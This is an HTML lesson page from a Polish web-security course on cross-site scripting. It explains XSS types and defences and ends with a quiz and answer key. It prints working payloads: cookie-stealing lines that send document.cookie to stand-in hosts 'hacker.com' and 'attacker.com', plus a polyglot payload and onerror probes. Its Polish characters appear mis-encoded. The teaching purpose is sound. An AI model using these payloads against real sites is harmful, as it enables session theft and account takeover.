<!DOCTYPE html>
<html lang="pl">

<head>
     <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="AnnaWiktoria">
    <meta name="copyright" content="AnnaWiktoria">
    <meta name="description" content="Interaktywny kurs bezpiecze≈Ñstwa aplikacji webowych. Licencja CC BY-NC-SA.">

    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
               font-src 'self' https://fonts.gstatic.com; 
               script-src 'self' 'unsafe-inline'; 
               img-src 'self' data:;">

    <title>Kurs bezpiecze≈Ñstwa aplikacji webowych - Lekcja 09: XSS (Cross-Site Scripting)</title>

     <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="style.css">

    <style>
        /* Akcent: Electric Cyan (Client-Side / JavaScript execution) */
        :root {
            --accent: #00e676;
            --accent-glow: rgba(0, 230, 118, 0.3);
        }

        .code-js {
            color: #ffff00;
        }

        .code-html {
            color: #00e5ff;
        }
    </style>
</head>

<body>

    <div class="container">
        <header>
            <h1>CROSS-SITE SCRIPTING (XSS)</h1>
            <p>MODU≈Å 09: &lt;script&gt;alert(1)&lt;/script&gt; i kradzie≈º to≈ºsamo≈õci</p>
        </header>

        <!-- 1. DEFINICJA -->
        <section>
            <h2>> CZYM JEST XSS?</h2>
            <p>XSS to b≈ÇƒÖd polegajƒÖcy na tym, ≈ºe aplikacja bierze dane od u≈ºytkownika i wy≈õwietla je na stronie
                <strong>bez czyszczenia</strong>. PrzeglƒÖdarka my≈õli, ≈ºe to kod strony i go wykonuje.</p>

            <div class="card">
                <h3>ANATOMIA ATAKU</h3>
                <p>Haker wpisuje w komentarzu:</p>
                <pre><code>Cze≈õƒá! &lt;script&gt;<span class="code-js">fetch('https://hacker.com?c='+document.cookie)</span>&lt;/script&gt;</code></pre>
                <p><strong>Efekt:</strong> Ka≈ºdy, kto wy≈õwietli ten komentarz (np. Admin), nie≈õwiadomie wy≈õle swoje
                    ciasteczka sesyjne do hakera. To prowadzi do przejƒôcia konta (Account Takeover).</p>
            </div>
        </section>

        <!-- 2. TYPY XSS -->
        <section>
            <h2>> TRZY TWARZE XSS</h2>
            <p>Jako pentester musisz rozr√≥≈ºniaƒá, jak payload trafia do ofiary.</p>

            <div class="card">
                <h3>1. REFLECTED XSS (Odbity)</h3>
                <p>Z≈Ço≈õliwy kod znajduje siƒô <strong>w linku</strong> (URL). Serwer "odbija" go z powrotem do
                    przeglƒÖdarki.</p>
                <ul>
                    <li><strong>Wektor:</strong> Link w mailu/SMS:
                        <code>site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                    <li><strong>Zasiƒôg:</strong> Tylko osoba, kt√≥ra kliknie w link.</li>
                    <li><strong>Cel:</strong> Phishing, kradzie≈º sesji konkretnej osoby.</li>
                </ul>
            </div>

            <div class="card">
                <h3>2. STORED XSS (Zapisany) - <span style="color:var(--danger)">NAJGRO≈πNIEJSZY</span></h3>
                <p>Z≈Ço≈õliwy kod zapisuje siƒô <strong>w bazie danych</strong> (np. w tre≈õci posta, komentarza, nazwie
                    u≈ºytkownika).</p>
                <ul>
                    <li><strong>Wektor:</strong> Haker dodaje komentarz na forum.</li>
                    <li><strong>Zasiƒôg:</strong> KA≈ªDY, kto wejdzie na stronƒô (nawet tysiƒÖce os√≥b).</li>
                    <li><strong>Cel:</strong> Masowa infekcja, robaki internetowe (Worms).</li>
                </ul>
            </div>

            <div class="card">
                <h3>3. DOM-BASED XSS</h3>
                <p>B≈ÇƒÖd jest tylko w <strong>JavaScript</strong> po stronie przeglƒÖdarki. Serwer w og√≥le nie widzi
                    payloadu.</p>
                <ul>
                    <li><strong>Przyk≈Çad:</strong> Skrypt pobiera parametr z URL (<code>location.hash</code>) i wstawia
                        go do HTML przez <code>innerHTML</code>.</li>
                    <li><strong>Obrona:</strong> WAF (Web Application Firewall) tego nie wykryje, bo wszystko dzieje siƒô
                        w przeglƒÖdarce ofiary.</li>
                </ul>
            </div>
        </section>

        <!-- 3. OBRONA -->
        <section>
            <h2>> OBRONA: CONTEXT IS KING</h2>
            <p>Filtrowanie <code>&lt;script&gt;</code> to za ma≈Ço. Wszystko zale≈ºy od tego, gdzie lƒÖdujƒÖ dane.</p>

            <div class="card">
                <h3>MECHANIZMY OBRONNE</h3>
                <ol>
                    <li><strong>Output Encoding (Sanityzacja):</strong> Zamiast wy≈õwietlaƒá <code>&lt;</code>, wy≈õwietlaj
                        bezpieczne <code>&amp;lt;</code>. PrzeglƒÖdarka poka≈ºe znaczek, ale nie wykona kodu.</li>
                    <li><strong>CSP (Content Security Policy):</strong> Nag≈Ç√≥wek, kt√≥ry zablokuje wykonanie skrypt√≥w
                        inline, nawet je≈õli haker je wstrzyknie. (Pamiƒôtasz Lekcjƒô 4?).</li>
                    <li><strong>HttpOnly Cookies:</strong> Nawet je≈õli XSS zadzia≈Ça, haker nie ukradnie sesji JS-em
                        (Pamiƒôtasz Lekcjƒô 3?).</li>
                </ol>
            </div>

            <div class="card">
                <h3>PRZYK≈ÅADY PAYLOAD√ìW (Polyglots)</h3>
                <p>Pentesterzy u≈ºywajƒÖ ciƒÖg√≥w, kt√≥re dzia≈ÇajƒÖ w wielu kontekstach:</p>
                <pre><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;xmp&gt;<span class="code-html">&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</span></code></pre>
            </div>
        </section>

        <!-- CHECKLIST -->
        <section>
            <h2>CHECKLISTA / RED FLAGS</h2>
            <div class="card checklist-card">
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Input wchodzi, HTML wychodzi:</strong> Je≈õli wpisujesz `&lt;b&gt;test&lt;/b&gt;` i
                        widzisz pogrubiony tekst -> XSS jest bardzo prawdopodobny.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Parametry w URL odzwierciedlane na stronie:</strong> Np. "Nie znaleziono wynik√≥w dla:
                        [Tw√≥j Input]". Idealne miejsce na Reflected XSS.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>U≈ºywanie innerHTML w JS:</strong> W React/Vue/Angular u≈ºywanie
                        `dangerouslySetInnerHTML` lub `v-html` to proszenie siƒô o k≈Çopoty.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Brak CSP:</strong> Strona bez Content-Security-Policy jest naga w obliczu XSS.</div>
                </div>
            </div>
        </section>

        <!-- QUIZ -->
        <section id="quiz-section">
            <h2>üéì WERYFIKACJA WIEDZY</h2>
            <div id="quiz-container"></div>
        </section>

        <footer>
            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Hack & Learn: Web Edition | Modu≈Ç 09</p>
        </footer>
    </div>

    <!-- DANE DO QUIZU -->
    <script>
        const quizData = [
            {
                question: "Co jest g≈Ç√≥wnym celem ataku XSS?",
                options: [
                    "Usuniƒôcie bazy danych.",
                    "Wykonanie z≈Ço≈õliwego kodu JavaScript w przeglƒÖdarce ofiary (np. w celu kradzie≈ºy sesji).",
                    "Z≈Çamanie has≈Ça na serwerze.",
                    "PrzeciƒÖ≈ºenie ≈ÇƒÖcza internetowego."
                ],
                correct: 1,
                explanation: "XSS to atak na u≈ºytkownika (Client-Side), a nie bezpo≈õrednio na serwer. Haker u≈ºywa Twojej strony, by atakowaƒá Twoich klient√≥w."
            },
            {
                question: "Czym r√≥≈ºni siƒô Stored XSS od Reflected XSS?",
                options: [
                    "Reflected dzia≈Ça tylko w nocy.",
                    "Stored zapisuje siƒô trwale na serwerze (np. w komentarzu) i atakuje ka≈ºdego odwiedzajƒÖcego. Reflected wymaga, by ofiara kliknƒô≈Ça w specjalnie spreparowany link.",
                    "Stored dotyczy plik√≥w graficznych.",
                    "Nie ma r√≥≈ºnicy."
                ],
                correct: 1,
                explanation: "Stored (Persistence) jest gro≈∫niejszy, bo nie wymaga interakcji (klikania w link). Wchodzisz na stronƒô i jeste≈õ zainfekowany."
            },
            {
                type: "scenario",
                question: "Znalaz≈Çe≈õ podatno≈õƒá XSS. Chcesz udowodniƒá klientowi, ≈ºe to krytyczny b≈ÇƒÖd (PoC - Proof of Concept). Jaki payload zrobi najwiƒôksze wra≈ºenie (ukazujƒÖc realne ryzyko)?",
                options: [
                    "&lt;script&gt;alert(1)&lt;/script&gt;",
                    "&lt;h1&gt;HACKED&lt;/h1&gt;",
                    "&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;",
                    "&lt;u&gt;test&lt;/u&gt;"
                ],
                correct: 2,
                explanation: "Alert(1) dowodzi istnienia b≈Çƒôdu. Ale kradzie≈º ciasteczka (Cookie Stealing) pokazuje biznesowy skutek: przejƒôcie konta."
            },
            {
                question: "Jaki mechanizm przeglƒÖdarki (nag≈Ç√≥wek) najskuteczniej ogranicza skutki XSS?",
                options: [
                    "Access-Control-Allow-Origin",
                    "Content-Security-Policy (CSP)",
                    "X-Frame-Options",
                    "Strict-Transport-Security"
                ],
                correct: 1,
                explanation: "CSP dzia≈Ça jak Firewall w przeglƒÖdarce. Nawet je≈õli haker wstrzyknie `<script>`, CSP zablokuje jego wykonanie lub wys≈Çanie danych na obcy serwer."
            },
            {
                type: "scenario",
                question: "Programista u≈ºy≈Ç funkcji 'strip_tags()', kt√≥ra usuwa znaczniki &lt;script&gt;. Czy to wystarczy?",
                options: [
                    "Tak, bez &lt;script&gt; nie ma XSS.",
                    "Nie. Mo≈ºna wykonaƒá JS w atrybutach zdarze≈Ñ, np. &lt;img src=x onerror=alert(1)&gt; lub w linkach &lt;a href='javascript:alert(1)'&gt;.",
                    "Tak, to najlepsza metoda.",
                    "Zale≈ºy od wersji PHP."
                ],
                correct: 1,
                explanation: "To klasyczny b≈ÇƒÖd. JavaScript mo≈ºna uruchomiƒá na dziesiƒÖtki sposob√≥w bez u≈ºycia tagu script (event handlers: onmouseover, onerror, onload, onclick)."
            },
            {
                question: "Co to jest DOM-Based XSS?",
                options: [
                    "XSS wystƒôpujƒÖcy w plikach PDF.",
                    "Atak, w kt√≥rym payload nie trafia do serwera, lecz jest przetwarzany wy≈ÇƒÖcznie przez JavaScript w przeglƒÖdarce (np. pobierany z fragmentu URL po #).",
                    "Atak na domenƒô.",
                    "Atak na serwer DNS."
                ],
                correct: 1,
                explanation: "DOM XSS jest trudny do wykrycia przez logi serwera, bo serwer czƒôsto w og√≥le nie widzi z≈Ço≈õliwego ciƒÖgu (fragment po # nie jest wysy≈Çany do backendu)."
            },
            {
                question: "Kt√≥ra flaga ciasteczka utrudnia kradzie≈º sesji przy ataku XSS?",
                options: [
                    "Secure",
                    "SameSite",
                    "HttpOnly",
                    "Domain"
                ],
                correct: 2,
                explanation: "Powtarzamy to do znudzenia, bo to wa≈ºne: HttpOnly blokuje `document.cookie`. XSS zadzia≈Ça, alert wyskoczy, ale ciastka nie ukradniesz."
            },
            {
                question: "Co to jest 'Output Encoding' (Escaping)?",
                options: [
                    "Szyfrowanie danych w bazie.",
                    "Zamiana znak√≥w specjalnych na ich bezpieczne odpowiedniki HTML (np. < na &amp;lt;) przed wy≈õwietleniem ich w przeglƒÖdarce.",
                    "Kompresja obrazk√≥w.",
                    "Ukrywanie kodu ≈∫r√≥d≈Çowego."
                ],
                correct: 1,
                explanation: "To najskuteczniejsza metoda naprawy (remediacji) XSS. Dane sƒÖ traktowane jako tre≈õƒá (tekst), a nie jako kod wykonywalny."
            },
            {
                type: "scenario",
                question: "Widzisz pole wyszukiwania, kt√≥re wy≈õwietla: 'Wyniki dla: <b>UserInpu</b>'. Jak sprawdziƒá czy jest podatne na XSS?",
                options: [
                    "Wpisaƒá bardzo d≈Çugi tekst.",
                    "Wpisaƒá tagi HTML, np. &lt;u&gt;test&lt;/u&gt; lub &lt;img src=x onerror=alert(1)&gt; i sprawdziƒá, czy zostanƒÖ wyrenderowane przez przeglƒÖdarkƒô.",
                    "Wpisaƒá SQL Injection.",
                    "KliknƒÖƒá prawym przyciskiem myszy."
                ],
                correct: 1,
                explanation: "Je≈õli przeglƒÖdarka 'zrozumie' Tw√≥j HTML (pogrubi, podkre≈õli, albo spr√≥buje za≈Çadowaƒá obrazek), znaczy to, ≈ºe input nie jest czyszczony."
            },
            {
                question: "Czy XSS mo≈ºe byƒá u≈ºyty do ataku CSRF?",
                options: [
                    "Nie, to dwa r√≥≈ºne ataki.",
                    "Tak. Je≈õli masz XSS, mo≈ºesz za pomocƒÖ JS wys≈Çaƒá dowolne ≈ºƒÖdanie w imieniu u≈ºytkownika, automatycznie omijajƒÖc tokeny anty-CSRF (bo JS mo≈ºe je odczytaƒá ze strony).",
                    "Tylko w Internet Explorerze.",
                    "Tylko je≈õli strona u≈ºywa Flash."
                ],
                correct: 1,
                explanation: "XSS to 'kr√≥l'. Je≈õli masz XSS, masz te≈º CSRF, masz dane, masz sesjƒô. XSS pozwala wykonaƒá ka≈ºdƒÖ akcjƒô, kt√≥rƒÖ mo≈ºe wykonaƒá u≈ºytkownik."
            }
        ];
    </script>

    <script src="quiz.js"></script>

</body>


</html>

